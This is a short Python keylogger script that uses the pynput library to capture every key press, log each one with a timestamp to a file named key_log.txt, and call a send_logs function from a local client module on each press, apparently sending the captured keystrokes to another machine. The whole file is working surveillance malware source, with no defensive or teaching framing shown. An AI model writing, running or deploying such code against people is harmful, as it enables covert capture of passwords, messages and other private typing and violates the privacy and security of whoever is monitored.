from pynput import keyboard
import logging
from client import send_logs

log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='["%(asctime)s", %(message)s]')

def on_press(key):
    print(str(key))
    logging.info(str(key))
    send_logs()
       


# Collect events until released
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
